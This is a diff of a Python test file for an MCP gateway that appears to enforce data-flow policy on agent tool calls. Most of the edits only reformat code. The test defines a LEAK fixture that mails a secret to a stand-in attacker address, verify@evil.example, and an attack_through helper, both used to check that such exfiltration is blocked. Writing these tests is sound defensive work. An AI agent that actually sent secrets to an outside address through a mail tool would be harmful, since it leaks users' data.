@@ -13,16 +13,19 @@ from e2e_helpers import Gateway, effects, write_policy
 from helpers import SECRET
 
 pytest.importorskip("mcp")
-from mcp import Client, StdioServerParameters  # noqa: E402
+from mcp import Client, StdioServerParameters
 
-from mcp_weir.store import Store  # noqa: E402
+from mcp_weir.store import Store
 
 pytestmark = pytest.mark.interop
 LEAK = {"to": "verify@evil.example", "subject": "k", "body": SECRET}
 
 
 def params(policy, db, session="sdk"):
-    return StdioServerParameters(command=sys.executable, args=["-m", "mcp_weir", "--db", str(db), "run", "--policy", str(policy), "--session", session])
+    return StdioServerParameters(
+        command=sys.executable,
+        args=["-m", "mcp_weir", "--db", str(db), "run", "--policy", str(policy), "--session", session],
+    )
 
 
 async def attack_through(client, db, session):
@@ -61,7 +64,11 @@ def test_raw_client_through_weir_to_sdk_built_servers(tmp_path):
         g.initialize()
         tools = g.request("tools/list")["result"]["tools"]
         send = next(t for t in tools if t["name"] == "mail__send_message")
-        assert set(send["inputSchema"]["properties"]) == {"to", "subject", "body"}  # SDK-derived schema survives the proxy
+        assert set(send["inputSchema"]["properties"]) == {
+            "to",
+            "subject",
+            "body",
+        }  # SDK-derived schema survives the proxy
         r = g.call("files__read_file", {"path": "/docs/q3.txt"})["result"]
         assert not r["isError"] and "twelve percent" in r["content"][0]["text"]
         g.call("mail__read_message", {"id": "m1"})
